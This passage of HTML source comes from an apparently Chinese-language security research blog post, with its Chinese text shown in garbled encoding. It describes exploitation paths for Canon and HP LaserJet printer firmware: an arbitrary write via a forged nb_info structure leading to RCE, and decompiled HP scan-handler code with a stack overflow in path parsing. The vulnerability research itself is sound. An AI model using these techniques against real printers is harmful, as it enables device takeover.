      &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2392&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2393&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2396&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2372&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; æœƒæŠŠ response_buf-&amp;gt;id å¯«æˆ nbinfo-&amp;gt;idã€‚&lt;/p&gt;

&lt;p&gt;ä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœæˆ‘å€‘å¯ä»¥è¦†è“‹æ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; çµæ§‹ï¼Œä¸¦ä¸”æ§‹é€  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; æˆ‘å€‘å°±æœƒæœ‰ä¸€å€‹ä»»æ„è¨˜æ†¶é«”å¯«å…¥ï¼Œè€Œå¯¦éš›ä¸Šæ§‹é€ æ–¹å¼å¾ˆç°¡å–®ï¼Œåªè¦æ‰¾å€‹ Global Buffer å»æ§‹é€ å°±å¯ä»¥äº†ï¼Œæˆ‘å€‘é€™é‚Šé¸æ“‡äº† BJNP Session Buffer å»æ§‹é€ æˆ‘å€‘çµæ§‹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œåœ¨æˆ‘å€‘æœ‰ä»»æ„å¯«å…¥ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥è¦†è“‹ SLP çš„å‡½æ•¸æŒ‡é‡ä¾†é”æˆ RCEï¼Œå¾ŒçºŒåˆ©ç”¨å°±èˆ‡å‰è¿°ç›¸åŒï¼Œé€™é‚Šå°±ä¸å¦å¤–å¤šåšä»‹ç´¹äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡ç›®æ¨™æ˜¯ HP Collor LaserJet Pro M479fdw é€™å°å°è¡¨æ©Ÿï¼Œå…¶ä¸»è¦æ˜¯ Linux Base çš„ï¼Œåˆ†æèµ·ä¾†ç›¸å°å–®ç´”å¾ˆå¤šï¼Œè€Œå…¶ä¸­ Web Service åº•ä¸‹æœ‰è¨±å¤šçš„ cgi ä¾†æä¾›å„ç¨®ä¸åŒçš„å°è¡¨æ©Ÿæ“ä½œï¼Œé€™äº›éƒ½æ˜¯é€é FastCGI æ–¹å¼ä¾†é‹ä½œï¼Œå¯åƒè€ƒ nginx config ä¾†çœ‹æ¯å€‹ path åˆ†åˆ¥å°æ‡‰åˆ°å“ªå€‹ Port åŠå“ªå€‹ Service&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Sirius/rom/httpmgr_nginx/ledm.conf&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20231106/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;/usr/bin/local/slanapp&lt;/strong&gt; è² è²¬è™•ç† scan ç›¸é—œçš„æ“ä½œï¼Œä¸»è¦ listen åœ¨ 127.0.0.1:14030&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç•¶æˆ‘å€‘å­˜å– /Scan/Jobs è·¯å¾‘æ™‚ï¼Œå°±æœƒé€éé€™å€‹ cgi ä¾†è™•ç†&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æ¼æ´ä½ç½®&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ç•¶ HP è™•ç† /Scan/Jobs åº•ä¸‹çš„ get è«‹æ±‚æ™‚ï¼Œæœƒä½¿ç”¨ rest_scan_handle_get_request ä¾†è™•ç†ï¼ŒåŒæ™‚ä¹Ÿæœƒå°‡ pathinfo ä¸€èµ·å‚³å…¥&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-D8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-B8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+48h] [bp-98h] BYREF&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/UserReadyToScan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/Jobs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_37:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x411FA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//------------------------------------------------------ [2]  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Pages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
